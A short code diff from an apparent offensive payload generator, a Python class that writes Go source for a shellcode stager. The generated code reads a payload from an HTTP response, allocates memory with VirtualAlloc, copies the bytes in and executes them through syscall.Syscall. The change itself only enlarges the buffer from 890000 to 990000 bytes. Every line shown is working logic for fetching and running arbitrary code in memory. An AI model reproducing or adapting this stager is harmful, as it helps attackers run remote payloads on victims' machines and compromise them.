@@ -96,7 +96,7 @@ class Payload:
         payloadCode += "defer %s.Body.Close()\n" %(response)
         payloadCode += "%s, _ := ioutil.ReadAll(%s.Body)\n" %(payload, response)
         payloadCode += "%s, _ := %s(uintptr(len(%s)))\n" %(addr, virtualAlloc, payload)
-        payloadCode += "%s := (*[890000]byte)(unsafe.Pointer(%s))\n" %(bufferVar, addr)
+        payloadCode += "%s := (*[990000]byte)(unsafe.Pointer(%s))\n" %(bufferVar, addr)
         payloadCode += "for %s, %s := range %s {\n" %(x, value, payload)
         payloadCode += "%s[%s] = %s\n}\n" %(bufferVar, x, value)
         payloadCode += "syscall.Syscall(%s, 0, 0, 0, 0)\n}\n" %(addr)
